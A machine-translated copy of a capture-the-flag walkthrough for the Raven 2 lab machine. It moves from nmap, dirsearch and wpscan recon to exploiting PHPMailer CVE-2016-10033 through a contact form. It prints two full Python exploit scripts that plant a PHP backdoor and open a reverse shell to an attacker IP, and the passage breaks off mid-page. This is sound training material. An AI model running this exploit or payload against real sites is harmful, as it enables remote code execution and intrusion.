<html>
<head>
<title>RAVEN 2 Walkthrough (OSWE like machine )</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">拉夫EN 2漫游(OSWE像机器)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/raven-2-walkthrough-oswe-like-machine-98bdfc62b9bf?source=collection_archive---------0-----------------------#2022-11-30">https://infosecwriteups.com/raven-2-walkthrough-oswe-like-machine-98bdfc62b9bf?source=collection_archive---------0-----------------------#2022-11-30</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="402e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗨！我的名字是Hashar Mujahid，今天我们要解决一个来自vulnhub的房间，它被TJ-Null列为OSWE机器。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/49ce48bda3534611e123d0bfdbe2a1e9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7hQz7OyTNqQZgYyx.jpg"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">大乌鸦</figcaption></figure><h1 id="3e0f" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated"><strong class="ak">枚举:</strong></h1><h2 id="f970" class="lz lc iq bd ld ma mb dn lh mc md dp ll jy me mf lp kc mg mh lt kg mi mj lx mk bi translated">主机发现:</h2><p id="8d6d" class="pw-post-body-paragraph jn jo iq jp b jq ml js jt ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk ij bi translated">我们将从发现网络上的潜在目标开始。为此，我们可以使用多种工具，如netdiscover、fping或nmap。</p><pre class="km kn ko kp gt mq mr ms bn mt mu bi"><span id="1aac" class="mv lc iq mr b be mw mx l my mz">fping -a -g 192.168.59.0/24 2&gt;/dev/null<br/><br/>root@kali:/home/kali/Desktop/ctfs/Raven2-Vulnhun# fping -a -g 192.168.59.0/24 2&gt;/dev/null<br/>192.168.59.1<br/>192.168.59.2<br/>192.168.59.128<br/>192.168.59.130 ==&gt; HOST IP ADRESS</span></pre><p id="a9b2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以用nmap执行同样的操作。</p><pre class="km kn ko kp gt mq mr ms bn mt mu bi"><span id="5d40" class="mv lc iq mr b be mw mx l my mz">root@kali:/home/kali/Desktop/ctfs/Raven2-Vulnhun# nmap -sn 192.168.59.0/24<br/>Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-30 02:40 EST<br/>Nmap scan report for 192.168.59.1<br/>Host is up (0.00067s latency).<br/>MAC Address: 00:50:56:C0:00:08 (VMware)<br/>Nmap scan report for 192.168.59.2<br/>Host is up (0.00054s latency).<br/>MAC Address: 00:50:56:E4:EA:5C (VMware) ===&gt; Target<br/>Nmap scan report for 192.168.59.128<br/>Host is up (0.00061s latency).<br/>MAC Address: 00:0C:29:7A:56:5E (VMware)<br/>Nmap scan report for 192.168.59.254<br/>Host is up (0.00056s latency).<br/>MAC Address: 00:50:56:FE:B2:BF (VMware)<br/>Nmap scan report for 192.168.59.130<br/>Host is up.<br/>Nmap done: 256 IP addresses (5 hosts up) scanned in 4.76 seconds</span></pre><p id="cd65" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们有了目标的ip地址。接下来，我们要做的是运行端口扫描，查看哪些端口是打开的，哪些服务正在这些端口上运行。</p><h2 id="9d83" class="lz lc iq bd ld ma mb dn lh mc md dp ll jy me mf lp kc mg mh lt kg mi mj lx mk bi translated">端口扫描:</h2><p id="645c" class="pw-post-body-paragraph jn jo iq jp b jq ml js jt ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk ij bi translated">我们可以使用nmap来执行这项任务。</p><pre class="km kn ko kp gt mq mr ms bn mt mu bi"><span id="948b" class="mv lc iq mr b be mw mx l my mz">root@kali:/home/kali/Desktop/ctfs/Raven2-Vulnhun# sudo nmap -sC -sV -p- -oN nmap/scan 192.168.59.128 <br/>Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-30 02:44 EST<br/>Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br/>SYN Stealth Scan Timing: About 30.47% done; ETC: 02:45 (0:00:07 remaining)<br/>Nmap scan report for 192.168.59.128<br/>Host is up (0.00087s latency).<br/>Not shown: 65531 closed tcp ports (reset)<br/>PORT      STATE SERVICE VERSION<br/>22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)<br/>| ssh-hostkey: <br/>|   1024 2681c1f35e01ef93493d911eae8b3cfc (DSA)<br/>|   2048 315801194da280a6b90d40981c97aa53 (RSA)<br/>|   256 1f773119deb0e16dca77077684d3a9a0 (ECDSA)<br/>|_  256 0e8571a8a2c308699c91c03f8418dfae (ED25519)<br/>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))<br/>|_http-title: Raven Security<br/>|_http-server-header: Apache/2.4.10 (Debian)<br/>111/tcp   open  rpcbind 2-4 (RPC #100000)<br/>| rpcinfo: <br/>|   program version    port/proto  service<br/>|   100000  2,3,4        111/tcp   rpcbind<br/>|   100000  2,3,4        111/udp   rpcbind<br/>|   100000  3,4          111/tcp6  rpcbind<br/>|   100000  3,4          111/udp6  rpcbind<br/>|   100024  1          36026/tcp6  status<br/>|   100024  1          42894/tcp   status<br/>|   100024  1          49163/udp6  status<br/>|_  100024  1          54484/udp   status<br/>42894/tcp open  status  1 (RPC #100024)<br/>MAC Address: 00:0C:29:7A:56:5E (VMware)<br/>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/><br/>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>Nmap done: 1 IP address (1 host up) scanned in 24.36 seconds</span></pre><p id="0cd3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的目标是在端口22上运行SSH服务，在端口80上运行web服务器，在111和42894上运行rpc。</p><p id="a74a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们还应该执行udp扫描。</p><pre class="km kn ko kp gt mq mr ms bn mt mu bi"><span id="4f06" class="mv lc iq mr b be mw mx l my mz">root@kali:/home/kali/Desktop/ctfs/Raven2-Vulnhun# sudo nmap -sU -oN nmap/udp-scan 192.168.59.128 <br/>Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-30 02:48 EST                                                                                                                               <br/>Stats: 0:02:15 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan<br/>UDP Scan Timing: About 2.49% done; ETC: 04:20 (1:28:55 remaining)<br/>Nmap scan report for 192.168.59.128<br/>Host is up (0.00087s latency).<br/>Not shown: 997 closed udp ports (port-unreach)<br/>PORT     STATE         SERVICE<br/>68/udp   open|filtered dhcpc<br/>111/udp  open          rpcbind<br/>1007/udp open|filtered unknown<br/>MAC Address: 00:0C:29:7A:56:5E (VMware)<br/><br/>Nmap done: 1 IP address (1 host up) scanned in 1218.88 seconds</span></pre><p id="5126" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们列举这些服务。</p><h2 id="02ef" class="lz lc iq bd ld ma mb dn lh mc md dp ll jy me mf lp kc mg mh lt kg mi mj lx mk bi translated">WEB枚举:</h2><p id="5cd0" class="pw-post-body-paragraph jn jo iq jp b jq ml js jt ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk ij bi translated">我们有一个运行在80端口的web服务器，让我们访问它并找到一些有用的信息。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi na"><img src="../Images/68f0d1a46dc84d4c80cf54b1cd749acb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*xlkFN6Hl4vWAYLiS"/></div></div></figure><h2 id="e729" class="lz lc iq bd ld ma mb dn lh mc md dp ll jy me mf lp kc mg mh lt kg mi mj lx mk bi translated">目录扫描:</h2><p id="57a2" class="pw-post-body-paragraph jn jo iq jp b jq ml js jt ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk ij bi translated">我们可以使用dirsearch来搜索目录。</p><pre class="km kn ko kp gt mq mr ms bn mt mu bi"><span id="a7ae" class="mv lc iq mr b be mw mx l my mz">root@kali:/home/kali/Desktop/ctfs/Raven2-Vulnhun# dirsearch --url http://192.168.59.128/<br/><br/>  _|. _ _  _  _  _ _|_    v0.4.2<br/> (_||| _) (/_(_|| (_| )<br/><br/>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br/><br/>Output File: /root/.dirsearch/reports/192.168.59.128/-_22-11-30_04-59-53.txt<br/><br/>Error Log: /root/.dirsearch/logs/errors-22-11-30_04-59-53.log<br/><br/>Target: http://192.168.59.128/<br/><br/>[04:59:53] Starting: <br/>[04:59:54] 301 -  313B  - /js  -&gt;  http://192.168.59.128/js/               <br/>[04:59:55] 200 -   18KB - /.DS_Store                                                                                  <br/>[05:00:09] 200 -   13KB - /about.html                                       <br/>[05:00:42] 200 -    9KB - /contact.php                                      <br/>[05:00:45] 301 -  314B  - /css  -&gt;  http://192.168.59.128/css/              <br/>[05:00:59] 301 -  316B  - /fonts  -&gt;  http://192.168.59.128/fonts/          <br/>[05:01:06] 301 -  314B  - /img  -&gt;  http://192.168.59.128/img/              <br/>[05:01:07] 200 -   16KB - /index.html                                       <br/>[05:01:10] 200 -    4KB - /js/                                              <br/>[05:01:19] 301 -  317B  - /manual  -&gt;  http://192.168.59.128/manual/        <br/>[05:01:19] 200 -  626B  - /manual/index.html<br/>[05:01:48] 403 -  302B  - /server-status                                    <br/>[05:01:48] 403 -  303B  - /server-status/                                   <br/>[05:02:06] 200 -    5KB - /vendor/                                          <br/>[05:02:10] 200 -    2KB - /wordpress/wp-login.php                           <br/>[05:02:11] 200 -   51KB - /wordpress/bash</span></pre><p id="f476" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">浏览目录寻找一些有趣的信息。在<code class="fe nb nc nd mr b">/vendor</code>目录中发现了一些有趣的信息。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ne"><img src="../Images/a3ef1df352b036684ed334423e25ecd5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1042/0*TEyWjS75S_lJP_5B"/></div></figure><blockquote class="nf ng nh"><p id="35cb" class="jn jo ni jp b jq jr js jt ju jv jw jx nj jz ka kb nk kd ke kf nl kh ki kj kk ij bi translated">标志1位于“路径”目录中。</p><p id="60a5" class="jn jo ni jp b jq jr js jt ju jv jw jx nj jz ka kb nk kd ke kf nl kh ki kj kk ij bi translated"><code class="fe nb nc nd mr b">/var/www/html/vendor/</code></p><p id="140c" class="jn jo ni jp b jq jr js jt ju jv jw jx nj jz ka kb nk kd ke kf nl kh ki kj kk ij bi translated">flag 1 { a2 C1 f 66 D2 b 8051 bd3a 5874 b5 b 6 e 43 e 21 }</p></blockquote><p id="65a6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通读目录看起来像php邮件程序安装在这个网站上，我们看到一个联系页面，其中有一个联系形式，点击mail.php，但回应是404找不到。</p><blockquote class="nf ng nh"><p id="157f" class="jn jo ni jp b jq jr js jt ju jv jw jx nj jz ka kb nk kd ke kf nl kh ki kj kk ij bi translated">在/vendor/version“5 . 2 . 16”中找到一个版本号</p></blockquote><p id="3cce" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">发现了一个域名<code class="fe nb nc nd mr b">raven.local</code>，所以把它添加到我们的<code class="fe nb nc nd mr b">/etc/hosts</code></p><p id="1ecc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意到WordPress也在网站上运行，让我们用wp-scan列举WordPress。</p><h2 id="847e" class="lz lc iq bd ld ma mb dn lh mc md dp ll jy me mf lp kc mg mh lt kg mi mj lx mk bi translated">WPSCAN:</h2><p id="64d8" class="pw-post-body-paragraph jn jo iq jp b jq ml js jt ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk ij bi translated">我们将使用wpscan找到一些关于wordpress的有趣信息。</p><pre class="km kn ko kp gt mq mr ms bn mt mu bi"><span id="292a" class="mv lc iq mr b be mw mx l my mz">                                                                                                                                     <br/>root@kali:/home/kali/Desktop/ctfs/Raven2-Vulnhun# wpscan --url http://raven.local/wordpress/ -e vp,vt,u,dbe --api-token &lt;token&gt;<br/>_______________________________________________________________<br/>         __          _______   _____<br/>         \ \        / /  __ \ / ____|<br/>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br/>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \<br/>            \  /\  /  | |     ____) | (__| (_| | | | |<br/>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br/><br/>         WordPress Security Scanner by the WPScan Team<br/>                         Version 3.8.22<br/>                               <br/>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br/>_______________________________________________________________<br/><br/>[i] Updating the Database ...<br/>[i] Update completed.<br/><br/>[+] URL: http://raven.local/wordpress/ [192.168.59.128]<br/>[+] Started: Wed Nov 30 05:38:40 2022<br/><br/>Interesting Finding(s):<br/><br/>[+] Headers<br/> | Interesting Entry: Server: Apache/2.4.10 (Debian)<br/> | Found By: Headers (Passive Detection)<br/> | Confidence: 100%<br/><br/>[+] XML-RPC seems to be enabled: http://raven.local/wordpress/xmlrpc.php<br/> | Found By: Direct Access (Aggressive Detection)<br/> | Confidence: 100%<br/> | References:<br/> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br/> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br/> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br/> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br/> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br/><br/>[+] WordPress readme found: http://raven.local/wordpress/readme.html<br/> | Found By: Direct Access (Aggressive Detection)<br/> | Confidence: 100%<br/><br/>[+] Upload directory has listing enabled: http://raven.local/wordpress/wp-content/uploads/<br/> | Found By: Direct Access (Aggressive Detection)<br/> | Confidence: 100%<br/><br/>[+] The external WP-Cron seems to be enabled: http://raven.local/wordpress/wp-cron.php<br/> | Found By: Direct Access (Aggressive Detection)<br/> | Confidence: 60%<br/> | References:<br/> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br/> |  - https://github.com/wpscanteam/wpscan/issues/1299<br/><br/>[+] WordPress version 4.8.21 identified (Outdated, released on 0001-01-01).<br/> | Found By: Rss Generator (Passive Detection)<br/> |  - http://raven.local/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8.21&lt;/generator&gt;<br/> |  - http://raven.local/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8.21&lt;/generator&gt;<br/><br/>[+] WordPress theme in use: twentyseventeen<br/> | Location: http://raven.local/wordpress/wp-content/themes/twentyseventeen/<br/> | Last Updated: 2022-11-02T00:00:00.000Z<br/> | Readme: http://raven.local/wordpress/wp-content/themes/twentyseventeen/README.txt<br/> | [!] The version is out of date, the latest version is 3.1<br/> | Style URL: http://raven.local/wordpress/wp-content/themes/twentyseventeen/style.css?ver=4.8.21<br/> | Style Name: Twenty Seventeen<br/> | Style URI: https://wordpress.org/themes/twentyseventeen/<br/> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...<br/> | Author: the WordPress team<br/> | Author URI: https://wordpress.org/<br/> |<br/> | Found By: Css Style In Homepage (Passive Detection)<br/> |<br/> | Version: 1.3 (80% confidence)<br/> | Found By: Style (Passive Detection)<br/> |  - http://raven.local/wordpress/wp-content/themes/twentyseventeen/style.css?ver=4.8.21, Match: 'Version: 1.3'<br/><br/>[+] Enumerating Vulnerable Plugins (via Passive Methods)<br/><br/>[i] No plugins Found.<br/><br/>[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)<br/> Checking Known Locations - Time: 00:00:02 &lt;=====================================================&gt; (480 / 480) 100.00% Time: 00:00:02<br/>[+] Checking Theme Versions (via Passive and Aggressive Methods)<br/><br/>[i] No themes Found.<br/><br/>[+] Enumerating DB Exports (via Passive and Aggressive Methods)<br/> Checking DB Exports - Time: 00:00:00 &lt;============================================================&gt; (71 / 71) 100.00% Time: 00:00:00<br/><br/>[i] No DB Exports Found.<br/><br/>[+] Enumerating Users (via Passive and Aggressive Methods)<br/> Brute Forcing Author IDs - Time: 00:00:01 &lt;=======================================================&gt; (10 / 10) 100.00% Time: 00:00:01<br/><br/>[i] User(s) Identified:<br/><br/>[+] michael<br/> | Found By: Author Posts - Author Pattern (Passive Detection)<br/> | Confirmed By:<br/> |  Rss Generator (Passive Detection)<br/> |  Wp Json Api (Aggressive Detection)<br/> |   - http://raven.local/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br/> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br/> |  Login Error Messages (Aggressive Detection)<br/><br/>[+] steven<br/> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br/> | Confirmed By: Login Error Messages (Aggressive Detection)<br/><br/>[+] WPScan DB API OK<br/> | Plan: free<br/> | Requests Done (during the scan): 3<br/> | Requests Remaining: 72<br/><br/>[+] Finished: Wed Nov 30 05:39:02 2022<br/>[+] Requests Done: 631<br/>[+] Cached Requests: 11<br/>[+] Data Sent: 171.725 KB<br/>[+] Data Received: 19.947 MB<br/>[+] Memory used: 294.805 MB<br/>[+] Elapsed time: 00:00:21</span></pre><blockquote class="nf ng nh"><p id="e939" class="jn jo ni jp b jq jr js jt ju jv jw jx nj jz ka kb nk kd ke kf nl kh ki kj kk ij bi translated">在<a class="ae nm" href="http://raven.local/wordpress/wp-content/uploads/2018/11/flag3.png" rel="noopener ugc nofollow" target="_blank">http://raven . local/WordPress/WP-content/uploads/2018/11/FLAG 3 . png</a>中找到标志3</p></blockquote><p id="e9fe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有两个用户迈克尔和史蒂文，我们需要某种凭证来尝试对这两个用户进入管理面板。我试过强行破解密码，但还是找点别的吧。</p><h1 id="1269" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">PHP代码在CONTACT-US页面中的执行；</h1><p id="04a0" class="pw-post-body-paragraph jn jo iq jp b jq ml js jt ju mm jw jx jy mn ka kb kc mo ke kf kg mp ki kj kk ij bi translated">通过阅读“SECURITY.md ”,我发现了一些有趣的事情。</p><p id="07b4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">PHP mailer 5 . 2 . 18(2016年12月发布)之前的版本易受<a class="ae nm" href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10033" rel="noopener ugc nofollow" target="_blank">CVE-2016–10033</a>远程代码执行漏洞的攻击，由<a class="ae nm" href="https://legalhackers.com" rel="noopener ugc nofollow" target="_blank">达维德·戈伦斯基</a>负责报告。</p><blockquote class="nf ng nh"><p id="efab" class="jn jo ni jp b jq jr js jt ju jv jw jx nj jz ka kb nk kd ke kf nl kh ki kj kk ij bi translated">我们的php版本是5.2.16，所以我们可能有一个RCE。让我们搜索它是如何工作的。</p></blockquote><p id="490c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">PHP Mailer 5 . 2 . 18之前版本中isMail传输中的mailSend函数可能允许远程攻击者向mail命令传递额外的参数，从而通过精心编制的Sender属性中的\ "执行任意代码。</p><p id="3c9f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我在legalhacker的博客上找到了这个漏洞的解释。</p><div class="nn no gp gr np nq"><a href="https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html" rel="noopener  ugc nofollow" target="_blank"><div class="nr ab fo"><div class="ns ab nt cl cj nu"><h2 class="bd ir gy z fp nv fr fs nw fu fw ip bi translated">PHP mailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln</h2><div class="nx l"><h3 class="bd b gy z fp nv fr fs nw fu fw dk translated">编辑描述</h3></div><div class="ny l"><p class="bd b dl z fp nv fr fs nw fu fw dk translated">legalhackers.com</p></div></div><div class="nz l"><div class="oa l ob oc od nz oe kv nq"/></div></div></a></div><p id="1e39" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">来自链接的POC。</p><pre class="km kn ko kp gt mq mr ms bn mt mu bi"><span id="21dc" class="mv lc iq mr b be mw mx l my mz">// Attacker's input coming from untrusted source such as $_GET , $_POST etc.<br/>// For example from a Contact form<br/><br/>$email_from = '"attacker\" -oQ/tmp/ -X/var/www/cache/phpcode.php  some"@email.com';<br/>$msg_body  = "&lt;?php phpinfo(); ?&gt;";</span></pre><p id="2421" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以通过将有效载荷放入以下字段来尝试。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi of"><img src="../Images/46bd1d2b8cdea4d961e6a92e7e875343.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*ejwGrMzXHYPNYkuV"/></div></div></figure><p id="5b69" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是我们似乎不能绕过这个验证。让我们来看看公众利用。</p><pre class="km kn ko kp gt mq mr ms bn mt mu bi"><span id="6ae7" class="mv lc iq mr b be mw mx l my mz">from requests_toolbelt import MultipartEncoder<br/>import requests<br/>import os<br/>import base64<br/>from lxml import html as lh<br/><br/>os.system('clear')<br/>print("\n")<br/>print(" █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ ")<br/>print("██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗")<br/>print("███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝")<br/>print("██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗")<br/>print("██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║")<br/>print("╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")<br/>print("      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com")<br/>print(" Version 1.0 - github.com/anarcoder - greetings opsxcq &amp; David Golunski\n")<br/><br/>target = 'http://localhost:8080'<br/>backdoor = '/backdoor.php'<br/><br/>payload = '&lt;?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'192.168.0.12\\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?&gt;'<br/>fields={'action': 'submit',<br/>        'name': payload,<br/>        'email': '"anarcoder\\\" -OQueueDirectory=/tmp -X/www/backdoor.php server\" @protonmail.com',<br/>        'message': 'Pwned'}<br/><br/>m = MultipartEncoder(fields=fields,<br/>                     boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')<br/><br/>headers={'User-Agent': 'curl/7.47.0',<br/>         'Content-Type': m.content_type}<br/><br/>proxies = {'http': 'localhost:8081', 'https':'localhost:8081'}<br/><br/><br/>print('[+] SeNdiNG eVIl SHeLL To TaRGeT....')<br/>r = requests.post(target, data=m.to_string(),<br/>                  headers=headers)<br/>print('[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D')<br/>r = requests.get(target+backdoor, headers=headers)<br/>if r.status_code == 200:<br/>    print('[+]  ExPLoITeD ' + target)</span></pre><p id="d1d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">发现这个漏洞，但它有一些问题。该漏洞似乎将post请求发送到web服务器的根目录，但我们在<code class="fe nb nc nd mr b">/contact.php</code>中有一个联系表单，在该表单之后的字段中缺少一个命名主题的参数。最重要的是，验证部分似乎也不工作，所以我不得不拿出我自己的。</p><p id="354f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">总结我的功绩看起来像这样。</p><pre class="km kn ko kp gt mq mr ms bn mt mu bi"><span id="6ffc" class="mv lc iq mr b be mw mx l my mz">from requests_toolbelt import MultipartEncoder<br/>import requests<br/>import os<br/>import base64<br/>from lxml import html as lh<br/><br/>os.system('clear')<br/>print("\n")<br/>print(" █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ ")<br/>print("██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗")<br/>print("███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝")<br/>print("██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗")<br/>print("██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║")<br/>print("╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")<br/>print("      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com")<br/>print(" Version 1.0 - github.com/anarcoder - greetings opsxcq &amp; David Golunski\n")<br/><br/>target = 'http://192.168.59.128/'<br/>direc='contact.php'<br/>backdoor = '/shell.php'<br/><br/>payload = '&lt;?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'192.168.59.130\\\',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?&gt;'<br/>fields={'action': 'submit',<br/>        'name': payload,<br/>        'subject':'test',<br/>        'email': '"attacker\\" -oQ/tmp/ -X/var/www/html/shell.php  some"@email.com',<br/>        'message': 'Pwned'}<br/><br/>m = MultipartEncoder(fields=fields,<br/>                     boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')<br/><br/>headers={'User-Agent': 'curl/7.47.0',<br/>         'Content-Type': m.content_type}<br/><br/>proxies = {'http': 'localhost:8081', 'https':'localhost:8081'}<br/><br/><br/>print('[+] SeNdiNG eVIl SHeLL To TaRGeT....')<br/>r = requests.post(target+direc, data=m.to_string(),<br/>                  headers=headers)<br/>print('[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D')<br/>r = requests.get(target+backdoor, headers=headers)<br/>if r.status_code == 200:<br/>    print('[+]  ExPLoITeD ' + target)<br/>else: <br/>        print('something is wrong')</span></pre><p id="a36f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在启动一个监听器并运行漏洞，之后你将不得不访问后门来启动连接。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi og"><img src="../Images/203cfc7aaef5297320215f443b7407c3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*M0FpkmkOjxROoq99"/></div></div></figure><p id="cc3a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在进攻方。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi oh"><img src="../Images/777e227e0483f0d080c4633dc6923e00.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*Y9smolr-bbD-mTB9"/></div></div></figure><p id="3db9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在使用python生成一个tty shell。</p><h2 id="fc42" class="lz lc iq bd ld ma mb dn lh mc md dp ll jy me mf lp kc mg mh lt kg mi mj 